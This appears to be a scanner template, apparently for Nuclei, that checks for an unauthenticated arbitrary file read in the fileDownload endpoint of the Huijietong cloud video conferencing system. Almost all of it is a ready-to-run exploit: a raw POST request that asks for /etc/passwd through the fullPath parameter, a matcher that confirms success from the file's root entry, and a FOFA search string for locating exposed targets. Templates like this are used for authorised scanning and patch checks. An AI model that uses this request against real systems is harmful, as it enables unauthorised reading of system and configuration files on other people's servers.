http:
    - matchers:
        - part: body
          regex:
            - root:.*:0:0
          type: regex
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /fileDownload?action=downloadBackupFile  HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
          Content-Type: application/x-www-form-urlencoded

          fullPath=%2Fetc%2Fpasswd
id: huijietong-fileDownload-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="/him/api/rest/v1.0/node/role"
        会捷通云视讯系统 fileDownload 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 会捷通云视讯系统 fileDownload 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/JCJgY7JFJWphQ49gYgpcXQ
    severity: high
    tags:
        - File reading
        - Huijietong
        - 会捷通云视讯
